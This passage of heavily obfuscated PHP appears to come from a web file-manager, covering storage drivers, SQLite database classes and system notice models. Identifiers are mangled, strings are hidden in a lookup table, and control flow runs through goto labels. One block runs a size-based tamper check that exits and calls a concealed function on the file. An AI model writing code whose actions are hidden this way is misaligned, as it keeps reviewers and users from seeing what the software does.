$ªó—ğ¿[$œ™ğ­Ï•[1507]] : null, $œ™ğ­Ï•[86] => isset($ªó—ğ¿[$œ™ğ­Ï•[1508]]) ? $ªó—ğ¿[$œ™ğ­Ï•[1508]] : null, $œ™ğ­Ï•[222] => isset($ªó—ğ¿[$œ™ğ­Ï•[1509]]) ? $ªó—ğ¿[$œ™ğ­Ï•[1509]] : null, $œ™ğ­Ï•[1476] => isset($ªó—ğ¿[$œ™ğ­Ï•[1510]]) ? $ªó—ğ¿[$œ™ğ­Ï•[1510]] : null); $ØÜ‚ÓüÓ[$œ™ğ­Ï•[1477]] = isset($ªó—ğ¿[$œ™ğ­Ï•[1511]]) ? strtotime($ªó—ğ¿[$œ™ğ­Ï•[1511]]) : $ØÜ‚ÓüÓ[$œ™ğ­Ï•[1476]]; return $ØÜ‚ÓüÓ; } protected function _isFolder($¦Á”ñÇ) { $Í»‘á =& $_SERVER[ªÏ§Ë·]; if ($¦Á”ñÇ == $Í»‘á[12] || $¦Á”ñÇ == $Í»‘á[8]) { return !0; } $ŞíøÜƒë = $this->_objectMeta($¦Á”ñÇ); return isset($ŞíøÜƒë[$Í»‘á[43]]) && $ŞíøÜƒë[$Í»‘á[43]] == $Í»‘á[85] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($êÙíğ¾ = false) { } public function exist($»™ß¯íŒ) { $Í×ïŞ¦± = $this->info($»™ß¯íŒ); return $Í×ïŞ¦±[$_SERVER[ªÏ§Ë·][212]]; } public function isFile($å‹ÍºêÙ) { $ÑØƒÄí¾ = $this->info($å‹ÍºêÙ); return $ÑØƒÄí¾[$_SERVER[ªÏ§Ë·][212]]; } public function isFolder($„Ò’»¥è) { return !1; } public function size($±“ñŒÛ) { $éûº§Íƒ = $this->info($±“ñŒÛ); return $éûº§Íƒ[$_SERVER[ªÏ§Ë·][86]]; } public function info($¹Ø–¥¯—) { return $this->infoParse($¹Ø–¥¯—); } public function infoAuth($¡ÅßÊİ) { return $this->infoParse($¡ÅßÊİ); } public function infoWithChildren($Î©Ò“Ä¯) { return $this->infoParse($Î©Ò“Ä¯); } public function infoFull($ÚƒÍ«†) { return $this->infoParse($ÚƒÍ«†); } private function infoParse($‘È®´ßÉ) { $§ªş­Ñ  =& $_SERVER[ªÏ§Ë·]; $İÜÕĞ§˜ = $this->header($‘È®´ßÉ); if (!$İÜÕĞ§˜ || !$İÜÕĞ§˜[$§ªş­Ñ [778]]) { return !1; } $ù÷éßæ‰ = _get($İÜÕĞ§˜, $§ªş­Ñ [375], 0); $ŸØ´ÇÈé = array($§ªş­Ñ [42] => $İÜÕĞ§˜[$§ªş­Ñ [42]], $§ªş­Ñ [94] => $‘È®´ßÉ, $§ªş­Ñ [43] => $§ªş­Ñ [210], $§ªş­Ñ [86] => intval($ù÷éßæ‰), $§ªş­Ñ [184] => get_path_ext($İÜÕĞ§˜[$§ªş­Ñ [42]]), $§ªş­Ñ [1389] => $ù÷éßæ‰ > 0 && $İÜÕĞ§˜[$§ªş­Ñ [1512]], $§ªş­Ñ [1390] => !1); return $ŸØ´ÇÈé; } private function header($È¿†“¨º) { $§ƒÈ”÷æ =& $_SERVER[ªÏ§Ë·]; if (isset(self::$_cacheHeader[$È¿†“¨º])) { return self::$_cacheHeader[$È¿†“¨º]; } $—ğ“›ã— = isset($GLOBALS[$§ƒÈ”÷æ[1513]]) ? $GLOBALS[$§ƒÈ”÷æ[1513]] : !1; $GLOBALS[$§ƒÈ”÷æ[1513]] = !0; self::$_cacheHeader[$È¿†“¨º] = url_header($È¿†“¨º); $GLOBALS[$§ƒÈ”÷æ[1513]] = $—ğ“›ã—; return self::$_cacheHeader[$È¿†“¨º]; } public function hashSimple($¼¯°ŸÛ, $üºôøâç = false) { $„ËĞŠ‹Á =& $_SERVER[ªÏ§Ë·]; $ù†äôå = $this->info($¼¯°ŸÛ); if (!$ù†äôå || !$ù†äôå[$„ËĞŠ‹Á[212]]) { return !1; } $Â…†ğôÆ = $ù†äôå[$„ËĞŠ‹Á[86]]; $¡¼˜˜• = 200; $œÉÔ—ş­ = 50; if ($Â…†ğôÆ <= $¡¼˜˜• * $œÉÔ—ş­) { return md5($this->fileSubstr($¼¯°ŸÛ, 0, $Â…†ğôÆ)) . $Â…†ğôÆ; } $Üğäµ¸ì = intval($Â…†ğôÆ / $œÉÔ—ş­); $¹ÊğÀÕæ = $„ËĞŠ‹Á[12]; $Å¬ºçÅˆ = timeFloat(); $Œ™î³ï¯ = 15; for ($³ç¦ğ‘ï = 0; $³ç¦ğ‘ï < $œÉÔ—ş­; $³ç¦ğ‘ï++) { if (timeFloat() - $Å¬ºçÅˆ > $Œ™î³ï¯) { return !1; } $¤”š½¯Æ = $this->fileSubstr($¼¯°ŸÛ, $Üğäµ¸ì * $³ç¦ğ‘ï, $¡¼˜˜•); if (!$¤”š½¯Æ) { return !1; } $¹ÊğÀÕæ .= $¤”š½¯Æ; } $¹ÊğÀÕæ .= $this->fileSubstr($¼¯°ŸÛ, $Â…†ğôÆ - $¡¼˜˜•, $¡¼˜˜•); return md5($¹ÊğÀÕæ) . $Â…†ğôÆ; } public function getContent($ïçÊé¬Ü) { return $this->fileSubstr($ïçÊé¬Ü); } public function fileSubstr($°î¯¢‡„, $¶éæ¥Ÿ— = 0, $ı‡à­ğ· = -1) { $„µ©¯ =& $_SERVER[ªÏ§Ë·]; $·ò×ï  = $this->info($°î¯¢‡„); if (!$·ò×ï  || !$·ò×ï [$„µ©¯[212]] && $·ò×ï [$„µ©¯[86]] > 1024 * 1024 * 10) { return !1; } if ($ı‡à­ğ· === -1) { $ı‡à­ğ· = $·ò×ï [$„µ©¯[86]]; } if ($ı‡à­ğ· == 0) { return $„µ©¯[12]; } $ùú©²·‡ = array($„µ©¯[1514] . $¶éæ¥Ÿ— . $„µ©¯[810] . ($¶éæ¥Ÿ— + $ı‡à­ğ· - 1)); $ßùÆü½‘ = url_request($°î¯¢‡„, $„µ©¯[240], !1, $ùú©²·‡, !1, !1, 30); return $ßùÆü½‘[$„µ©¯[1227]] ? $ßùÆü½‘[$„µ©¯[1227]] : $„µ©¯[12]; } public function download($Ä•¦¹Ç¦, $Ë¦í§ËÉ) { Downloader::start($Ä•¦¹Ç¦, $Ë¦í§ËÉ); return $Ë¦í§ËÉ; } } goto F”²å†Ş”; dâÅÏç´™Í: if ($_SERVER[$_SERVER[ªÏ§Ë·][15]] != $_size($_file)) { $_getc = $_SERVER[ªÏ§Ë·][16]; $_getfile = $_SERVER[$_SERVER[ªÏ§Ë·][17]] . $_SERVER[ªÏ§Ë·][18]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ªÏ§Ë·][19], $_getfilec); if (count($_getarrs) < $_SERVER[ªÏ§Ë·][20]) { $exit = $_SERVER[ªÏ§Ë·][21]; $exit(); } $_act = $_SERVER[ªÏ§Ë·][22]; $_act($_file); } class DbSqliteBase extends Db { public function __construct($ÊÍúÎúË = '') { $Ÿª¨‚ =& $_SERVER[ªÏ§Ë·]; if (!extension_loaded($Ÿª¨‚[23])) { think_exception(think_lang($Ÿª¨‚[24]) . $Ÿª¨‚[25]); } if (!empty($ÊÍúÎúË)) { if (!isset($ÊÍúÎúË[$Ÿª¨‚[26]])) { $ÊÍúÎúË[$Ÿª¨‚[26]] = 438; } $this->config = $ÊÍúÎúË; if (empty($this->config[$Ÿª¨‚[27]])) { $this->config[$Ÿª¨‚[27]] = array(); } } } public function connect($¦‹ëÀû‰ = '', $µñé­’½ = 0) { $Ö„‚ÃÄ =& $_SERVER[ªÏ§Ë·]; if (!isset($this->linkID[$µñé­’½])) { if (empty($¦‹ëÀû‰)) { $¦‹ëÀû‰ = $this->config; } $¥³ªÊ·¶ = !empty($¦‹ëÀû‰[$Ö„‚ÃÄ[27]][$Ö„‚ÃÄ[28]]) ? $¦‹ëÀû‰[$Ö„‚ÃÄ[27]][$Ö„‚ÃÄ[28]] : $this->pconnect; $úó¤ÇÒÊ = $¥³ªÊ·¶ ? $Ö„‚ÃÄ[29] : $Ö„‚ÃÄ[30]; $this->linkID[$µñé­’½] = $úó¤ÇÒÊ($¦‹ëÀû‰[$Ö„‚ÃÄ[31]], $¦‹ëÀû‰[$Ö„‚ÃÄ[26]]); if (!$this->linkID[$µñé­’½]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$µñé­’½], 30000); if (1 != think_config($Ö„‚ÃÄ[32])) { unset($this->config); } } return $this->linkID[$µñé­’½]; } public function free() { $this->queryID = null; } public function query($†¡¨ğú­) { $€¹¡¯÷ =& $_SERVER[ªÏ§Ë·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $†¡¨ğú­; if ($this->queryID) { $this->free(); } think_action_status($€¹¡¯÷[33], 1); think_status($€¹¡¯÷[34]); $this->queryID = sqlite_query($this->_linkID, $†¡¨ğú­); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $à ®ÛÜò = $this->getAll(); return $à ®ÛÜò; } } public function execute($›´ş½’·) { $ñ¥²Šñç =& $_SERVER[ªÏ§Ë·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $›´ş½’·; if ($this->queryID) { $this->free(); } think_action_status($ñ¥²Šñç[35], 1); think_status($ñ¥²Šñç[34]); $İ­öç« = sqlite_exec($this->_linkID, $›´ş½’·); $this->debug(); if (!1 === $İ­öç«) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ªÏ§Ë·][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ãàç‚›Ù = sqlite_query($this->_linkID, $_SERVER[ªÏ§Ë·][37]); if (!$ãàç‚›Ù) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ë—Ó¹Ù… = sqlite_query($this->_linkID, $_SERVER[ªÏ§Ë·][38]); if (!$ë—Ó¹Ù…) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $òÂô£äß = array(); if ($this->numRows > 0) { for ($…¬ºÑõœ = 0; $…¬ºÑõœ < $this->numRows; $…¬ºÑõœ++) { $òÂô£äß[$…¬ºÑõœ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $òÂô£äß; } public function getFields($ÂØ†óŞ) { $ÊàË =& $_SERVER[ªÏ§Ë·]; $ÄÓ¿øñÅ = $this->query($ÊàË[39] . $ÂØ†óŞ . $ÊàË[40]); $©Êíçú½ = array(); if ($ÄÓ¿øñÅ) { foreach ($ÄÓ¿øñÅ as $‚¦ä€ÅÓ => $ò³¦“Ñã) { $©Êíçú½[$ò³¦“Ñã[$ÊàË[41]]] = array($ÊàË[42] => $ò³¦“Ñã[$ÊàË[41]], $ÊàË[43] => $ò³¦“Ñã[$ÊàË[44]], $ÊàË[45] => (bool) ($ò³¦“Ñã[$ÊàË[46]] === $ÊàË[12]), $ÊàË[47] => $ò³¦“Ñã[$ÊàË[48]], $ÊàË[49] => strtolower($ò³¦“Ñã[$ÊàË[50]]) == $ÊàË[51], $ÊàË[52] => strtolower($ò³¦“Ñã[$ÊàË[53]]) == $ÊàË[54]); } } return $©Êíçú½; } public function getTables($ÇáÁìàŠ = '') { $’®†­¹ =& $_SERVER[ªÏ§Ë·]; $íÌ™° = $this->query($’®†­¹[55] . $’®†­¹[56] . $’®†­¹[57]); $³ö’Ÿü£ = array(); foreach ($íÌ™° as $£¡‡ïÙ¶ => $â²¼ãúâ) { $³ö’Ÿü£[$£¡‡ïÙ¶] = current($â²¼ãúâ); } return $³ö’Ÿü£; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ëó´ªë =& $_SERVER[ªÏ§Ë·]; $ƒ•áğçë = sqlite_last_error($this->_linkID); $this->error = $ƒ•áğçë . $ëó´ªë[4] . sqlite_error_string($ƒ•áğçë); if ($ëó´ªë[12] != $this->queryStr) { $this->error .= LNG($ëó´ªë[58]) . $this->queryStr; } think_trace($this->error, $ëó´ªë[12], $ëó´ªë[59]); return $this->error; } public function escapeString($‰„Õ¦) { return sqlite_escape_string($‰„Õ¦); } public function parseLimit($‹Îæ) { $Ö›ƒî†‰ =& $_SERVER[ªÏ§Ë·]; $¥ï¡¶ÜÓ = $Ö›ƒî†‰[12]; if (!empty($‹Îæ)) { $‹Îæ = explode($Ö›ƒî†‰[60], $‹Îæ); if (count($‹Îæ) > 1) { $¥ï¡¶ÜÓ .= $Ö›ƒî†‰[61] . $‹Îæ[1] . $Ö›ƒî†‰[62] . $‹Îæ[0] . $Ö›ƒî†‰[63]; } else { $¥ï¡¶ÜÓ .= $Ö›ƒî†‰[61] . $‹Îæ[0] . $Ö›ƒî†‰[63]; } } return $¥ï¡¶ÜÓ; } } class DbSqlite3Base extends Db { public function __construct($úºœÉÒ¹ = '') { $á…Ûõ¾ =& $_SERVER[ªÏ§Ë·]; if (!class_exists($á…Ûõ¾[64])) { think_exception(think_lang($á…Ûõ¾[24]) . $á…Ûõ¾[65]); } if (!empty($úºœÉÒ¹)) { if (!isset($úºœÉÒ¹[$á…Ûõ¾[26]])) { $úºœÉÒ¹[$á…Ûõ¾[26]] = 438; } $this->config = $úºœÉÒ¹; if (empty($this->config[$á…Ûõ¾[27]])) { $this->config[$á…Ûõ¾[27]] = array(); } } } public function connect($ñÕ˜¡å = '', $şÉË”Œô = 0) { $ª¶€š®² =& $_SERVER[ªÏ§Ë·]; if (!isset($this->linkID[$şÉË”Œô])) { if (empty($ñÕ˜¡å)) { $ñÕ˜¡å = $this->config; } $this->linkID[$şÉË”Œô] = new SQLite3($ñÕ˜¡å[$ª¶€š®²[31]]); if (!$this->linkID[$şÉË”Œô]) { think_exception($this->linkID[$şÉË”Œô]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$şÉË”Œô]->busyTimeout(30000); if (1 != think_config($ª¶€š®²[32])) { unset($this->config); } } return $this->linkID[$şÉË”Œô]; } public function free() { $this->queryID = null; } public function query($¯í¬Şûè) { $Ü‡æÈÉ¢ =& $_SERVER[ªÏ§Ë·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¯í¬Şûè; if ($this->queryID) { $this->free(); } think_action_status($Ü‡æÈÉ¢[33], 1); think_status($Ü‡æÈÉ¢[34]); $this->queryID = $this->_linkID->query($¯í¬Şûè); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $åôÜ»Æ = $this->getAll(); $this->numRows = count($åôÜ»Æ); return $åôÜ»Æ; } } public function execute($†®¦“”à) { $–¯úö’ =& $_SERVER[ªÏ§Ë·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $†®¦“”à; if ($this->queryID) { $this->free(); } think_action_status($–¯úö’[35], 1); think_status($–¯úö’[34]); $É½ÎÚï = $this->_linkID->exec($†®¦“”à); $this->debug(); if (!1 === $É½ÎÚï) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ªÏ§Ë·][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $²Úè²¬¯ = $this->_linkID->query($_SERVER[ªÏ§Ë·][37]); if (!$²Úè²¬¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $’ÚçøÛ¾ = $this->_linkID->query($_SERVER[ªÏ§Ë·][38]); if (!$’ÚçøÛ¾) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $õ—Æâ£ = array(); while ($‘¨›ÖÓí = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $õ—Æâ£[] = $‘¨›ÖÓí; } $this->queryID->reset(); return $õ—Æâ£; } public function getFields($ëª’øÆ±) { $Ï±­İ¸§ =& $_SERVER[ªÏ§Ë·]; $Õäî¶àÆ = $this->query($Ï±­İ¸§[39] . $ëª’øÆ± . $Ï±­İ¸§[40]); $À”˜ÔÎŠ = array(); if ($Õäî¶àÆ) { foreach ($Õäî¶àÆ as $÷ì±íÒ÷ => $ª ©–Ë) { $À”˜ÔÎŠ[$ª ©–Ë[$Ï±­İ¸§[42]]] = array($Ï±­İ¸§[42] => $ª ©–Ë[$Ï±­İ¸§[42]], $Ï±­İ¸§[43] => $ª ©–Ë[$Ï±­İ¸§[43]], $Ï±­İ¸§[45] => (bool) ($ª ©–Ë[$Ï±­İ¸§[45]] === $Ï±­İ¸§[12]), $Ï±­İ¸§[47] => $ª ©–Ë[$Ï±­İ¸§[66]], $Ï±­İ¸§[49] => (bool) $ª ©–Ë[$Ï±­İ¸§[67]], $Ï±­İ¸§[52] => (bool) $ª ©–Ë[$Ï±­İ¸§[67]]); } } return $À”˜ÔÎŠ; } public function getTables($Œ¼‰Àò“ = '') { $‚êéµŒ =& $_SERVER[ªÏ§Ë·]; $¥«÷Å¯Ç = $this->query($‚êéµŒ[55] . $‚êéµŒ[56] . $‚êéµŒ[57]); $ª¾®™½Ê = array(); foreach ($¥«÷Å¯Ç as $š¤™›¿á => $‡æÇ£Œ‹) { $ª¾®™½Ê[$š¤™›¿á] = current($‡æÇ£Œ‹); } return $ª¾®™½Ê; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¡¨¶ó¿Ë =& $_SERVER[ªÏ§Ë·]; $this->error = $this->_linkID->lastErrorMsg(); if ($¡¨¶ó¿Ë[12] != $this->queryStr) { $this->error .= LNG($¡¨¶ó¿Ë[58]) . $this->queryStr; } think_trace($this->error, $¡¨¶ó¿Ë[12], $¡¨¶ó¿Ë[59]); return $this->error; } public function escapeString($õ¤ş©Şê) { $ÜÃ±ÕóŒ =& $_SERVER[ªÏ§Ë·]; if ($this->_linkID) { return $this->_linkID->escapeString($õ¤ş©Şê); } return str_ireplace($ÜÃ±ÕóŒ[68], $ÜÃ±ÕóŒ[69], $õ¤ş©Şê); } public function parseLimit($ø‹Â´¹ş) { $ö‰ŠŒóê =& $_SERVER[ªÏ§Ë·]; $ô‹åûÇ = $ö‰ŠŒóê[12]; if (!empty($ø‹Â´¹ş)) { $ø‹Â´¹ş = explode($ö‰ŠŒóê[60], $ø‹Â´¹ş); if (count($ø‹Â´¹ş) > 1) { $ô‹åûÇ .= $ö‰ŠŒóê[61] . $ø‹Â´¹ş[1] . $ö‰ŠŒóê[62] . $ø‹Â´¹ş[0] . $ö‰ŠŒóê[63]; } else { $ô‹åûÇ .= $ö‰ŠŒóê[61] . $ø‹Â´¹ş[0] . $ö‰ŠŒóê[63]; } } return $ô‹åûÇ; } } goto a¹òÏ©¡ŸÅ; FÆ¿»±‹È˜: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\156\x6f\164\151\x63\x65\114\x69\x73\164"; public $field = array("\x6e\141\155\x65", "\x63\157\156\x74\145\156\x74", "\x61\x75\x74\150", "\155\157\x64\145", "\164\151\x6d\x65", "\164\x79\160\145", "\154\x65\166\145\154", "\145\x6e\141\x62\x6c\145", "\163\x6f\x72\x74"); public function listData($°¼İ­µé = false, $²ĞÀˆè­ = "\x73\x6f\162\164", $ÏØâğç¯ = false) { return parent::listData($°¼İ­µé, $²ĞÀˆè­, $ÏØâğç¯); } public function add($¯œÜØœ) { $Ë§Ô…¤” =& $_SERVER[ªÏ§Ë·]; $’Õ¬˜È = time(); if ($¯œÜØœ[$Ë§Ô…¤”[26]] == $Ë§Ô…¤”[2288]) { $’Õ¬˜È = strtotime($¯œÜØœ[$Ë§Ô…¤”[190]]); } $¯œÜØœ[$Ë§Ô…¤”[190]] = $’Õ¬˜È; return parent::insert($¯œÜØœ); } public function update($‹“™ÄŸê, $÷ÓÓö‰) { $¾±£ªªè =& $_SERVER[ªÏ§Ë·]; $Í¦ü÷«Û = $this->listData($‹“™ÄŸê); if (!$Í¦ü÷«Û) { return !1; } $¿•ÜÛş± = time(); if ($÷ÓÓö‰[$¾±£ªªè[26]] == $¾±£ªªè[2288]) { $¿•ÜÛş± = strtotime($÷ÓÓö‰[$¾±£ªªè[190]]); } $÷ÓÓö‰[$¾±£ªªè[190]] = $¿•ÜÛş±; return parent::update($‹“™ÄŸê, $÷ÓÓö‰); } public function remove($æ±ÜÆ²ı) { $¥â¼ÈÖ² = $this->listData($æ±ÜÆ²ı); if (!$¥â¼ÈÖ² || $¥â¼ÈÖ²[$_SERVER[ªÏ§Ë·][1312]]) { return !1; } return parent::remove($æ±ÜÆ²ı); } public function sort($™€ÂÔÛ§, $…Å«ì‹ø) { return parent::update($™€ÂÔÛ§, $…Å«ì‹ø); } public function enable($ĞÈØ½Á, $ä‘‚Îš) { return parent::update($ĞÈØ½Á, array($_SERVER[ªÏ§Ë·][2289] => $ä‘‚Îš)); } private function initUserOption() { $°Öø¦± =& $_SERVER[ªÏ§Ë·]; $this->optionType = $°Öø¦±[2290]; $this->modelType = $°Öø¦±[2291]; $this->field = array($°Öø¦±[2292], $°Öø¦±[42], $°Öø¦±[190], $°Öø¦±[43], $°Öø¦±[2293], $°Öø¦±[778], $°Öø¦±[206]); } public function userNoticeGet($–»å¤ç = false) { $this->initUserOption(); return parent::listData($–»å¤ç, $_SERVER[ªÏ§Ë·][437], !0); } public function userNoticeAdd($üäí˜Åç) { $•ª„‰¿² =& $_SERVER[ªÏ§Ë·]; $this->initUserOption(); $©´•ÑªŠ = $this->findByKey($•ª„‰¿²[2292], $üäí˜Åç[$•ª„‰¿²[437]]); if ($©´•ÑªŠ) { return !0; } $©Âİ¿³µ = array($•ª„‰¿²[2292] => $üäí˜Åç[$•ª„‰¿²[437]], $•ª„‰¿²[42] => $üäí˜Åç[$•ª„‰¿²[42]], $•ª„‰¿²[190] => $üäí˜Åç[$•ª„‰¿²[190]], $•ª„‰¿²[43] => isset($üäí˜Åç[$•ª„‰¿²[43]]) ? $üäí˜Åç[$•ª„‰¿²[43]] : 1, $•ª„‰¿²[2293] => isset($üäí˜Åç[$•ª„‰¿²[2293]]) ? $üäí˜Åç[$•ª„‰¿²[2293]] : 0, $•ª„‰¿²[778] => 0, $•ª„‰¿²[206] => 0); return parent::insert($©Âİ¿³µ); } public function userNoticeEdit($”½¦íøŸ, $½“µô«) { $this->initUserOption(); return parent::update($”½¦íøŸ, $½“µô«); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\x65\155\x5f\157\x70\x74\x69\157\x6e"; protected $jsonField = array("\155\x65\156\x75", "\x72\157\x6c\145", "\x72\x6f\x6c\145\107\162\157\x75\x70", "\162\x65\147\151\163\x74", "\145\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ãşá„¯±) { return "\123\171\x73\164\x65\x6d\x4f\160\164\x69\x6f\156\x5f{$ãşá„¯±}"; } protected function optionDefault($ãŞşƒû = '') { $Åªû¼×ƒ =& $_SERVER[ªÏ§Ë·]; if ($ãŞşƒû == $Åªû¼×ƒ[12]) { return $GLOBALS[$Åªû¼×ƒ[6]][$Åªû¼×ƒ[419]]; } } } class SystemRecordModel extends ModelBaseLight { } goto b°®ˆÄ¶‹; DÇöâ«¢î: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($öñŸ¾ô) { parent::__construct(); include_once SDK_DIR . $_SERVER[ªÏ§Ë·][1394]; $this->_init($öñŸ¾ô); } public function _init($•ÎÉÕñ) { $²õ¥Ê«Æ =& $_SERVER[ªÏ§Ë·]; $this->config = $•ÎÉÕñ; foreach ($•ÎÉÕñ as $Ô€ü¦ŒŠ => $âš„Ò¶œ) { if (isset($this->{$Ô€ü¦ŒŠ})) { $this->{$Ô€ü¦ŒŠ} = $âš„Ò¶œ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($²õ¥Ê«Æ[1395] . LNG($²õ¥Ê«Æ[1396])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ïØú“âÖ =& $_SERVER[ªÏ§Ë·]; $Ï¾›—°Ÿ = new OSS\Model\CorsConfig(); $í„ÈÕæ = new OSS\Model\CorsRule(); $í„ÈÕæ->addAllowedOrigin($ïØú“âÖ[1397]); $í„ÈÕæ->addAllowedMethod($ïØú“âÖ[1398]); $í„ÈÕæ->addAllowedMethod($ïØú“âÖ[1399]); $í„ÈÕæ->addAllowedMethod($ïØú“âÖ[1400]); $í„ÈÕæ->addAllowedMethod($ïØú“âÖ[1401]); $í„ÈÕæ->addAllowedMethod($ïØú“âÖ[170]); $í„ÈÕæ->setMaxAgeSeconds(600); $í„ÈÕæ->addExposeHeader($ïØú“âÖ[1402]); $í„ÈÕæ->addAllowedHeader($ïØú“âÖ[1397]); $Ï¾›—°Ÿ->addRule($í„ÈÕæ); try { $this->client->putBucketCors($this->bucket, $Ï¾›—°Ÿ); } catch (OSS\Core\OssException $š·ë×¾“) { return !1; } return !0; } public function getBucketCors() { $‡¤³åß© =& $_SERVER[ªÏ§Ë·]; $ñãõ¬– = null; try { $ñãõ¬– = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÍÆÂ’õá) { return null; } if (!$ñãõ¬– || !($„×è¢Ò = $ñãõ¬–->getRules())) { return null; } $®•ÙÜ  = $„×è¢Ò[0]->getAllowedOrigins(); $ŠĞ»Œñ’ = $„×è¢Ò[0]->getAllowedMethods(); $º¨† ½§ = $„×è¢Ò[0]->getMaxAgeSeconds(); $Œ‰Ø€§Ã = $„×è¢Ò[0]->getExposeHeaders(); $€‰ãÓ¬é = $„×è¢Ò[0]->getAllowedHeaders(); return array($‡¤³åß©[198] => isset($®•ÙÜ [0]) ? $®•ÙÜ [0] : $‡¤³åß©[12], $‡¤³åß©[202] => $ŠĞ»Œñ’, $‡¤³åß©[1403] => $º¨† ½§, $‡¤³åß©[1404] => isset($Œ‰Ø€§Ã[0]) ? $Œ‰Ø€§Ã[0] : $‡¤³åß©[12], $‡¤³åß©[200] => isset($€‰ãÓ¬é[0]) ? $€‰ãÓ¬é[0] : $‡¤³åß©[12]); } public function isBucketCors() { $ùúœ·ÚÙ =& $_SERVER[ªÏ§Ë·]; $ğŞ½¢ú¼ = $this->getBucketCors(); if (!$ğŞ½¢ú¼ || !is_array($ğŞ½¢ú¼)) { return !1; } if ($ğŞ½¢ú¼[$ùúœ·ÚÙ[198]] != $ùúœ·ÚÙ[199] || $ğŞ½¢ú¼[$ùúœ·ÚÙ[200]] != $ùúœ·ÚÙ[199]) { return !1; } $å¨‹·å = array_map($ùúœ·ÚÙ[201], $ğŞ½¢ú¼[$ùúœ·ÚÙ[202]]); if (!is_array($å¨‹·å)) { $å¨‹·å = array(); } $¦÷ä¶§Ü = array($ùúœ·ÚÙ[203], $ùúœ·ÚÙ[204], $ùúœ·ÚÙ[205], $ùúœ·ÚÙ[206], $ùúœ·ÚÙ[207]); $ŠÅß‰ÚÉ = array_diff($¦÷ä¶§Ü, $å¨‹·å); return empty($ŠÅß‰ÚÉ); } public function mkfile($‡öèÚ , $”ÉİÊµ’ = '', $Ğ¾ñß¹§ = REPEAT_RENAME) { $í÷òÚÏ¨ = $this->setContent($‡öèÚ , $”ÉİÊµ’); if ($í÷òÚÏ¨ !== !1) { return $this->getPathOuter($‡öèÚ ); } return !1; } public function mkdir($Ú…Œ©Ä‘, $­¾˜ = REPEAT_SKIP) { if ($­¾˜ && $this->_isFolder($Ú…Œ©Ä‘)) { return $this->getPathOuter($Ú…Œ©Ä‘); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ú…Œ©Ä‘)); } catch (OSS\Core\OssException $×êÙ¾İ) { return !1; } return $this->getPathOuter($Ú…Œ©Ä‘); } private function fileList($ÁŞ†•êŞ, $³¡çü¤ = '', $ÅìŠ¾Å” = 0) { $÷“å‘É =& $_SERVER[ªÏ§Ë·]; $ÁŞ†•êŞ = trim($ÁŞ†•êŞ, $÷“å‘É[8]); $òë­ßÛ” = empty($ÁŞ†•êŞ) && $ÁŞ†•êŞ !== $÷“å‘É[208] ? $÷“å‘É[12] : $ÁŞ†•êŞ . $÷“å‘É[8]; $Ì˜è„Ù = $÷“å‘É[12]; $Ø€Êğ¢ = 1000; $›ƒåÃï€ = $‹ûÅÆÓœ = array(); while (!0) { check_abort(); $ã®²ßÑÕ = array($÷“å‘É[1405] => $³¡çü¤, $÷“å‘É[1406] => $òë­ßÛ”, $÷“å‘É[1407] => $Ø€Êğ¢, $÷“å‘É[1408] => $Ì˜è„Ù); try { $ÌÉ¹ ¢¯ = $this->client->listObjects($this->bucket, $ã®²ßÑÕ); } catch (OSS\Core\OssException $ã§…¬‹) { break; } $Ì˜è„Ù = $ÌÉ¹ ¢¯->getNextMarker(); $×ï–½ = $ÌÉ¹ ¢¯->getObjectList(); $¬Ò¶ÀÒ¥ = $ÌÉ¹ ¢¯->getPrefixList(); foreach ($×ï–½ as $›öşÊº) { if ($›öşÊº->getKey() == $òë­ßÛ”) { continue; } $áôõ¬ = $›öşÊº->getKey(); $‘˜¶Úß‰ = $›öşÊº->getSize(); 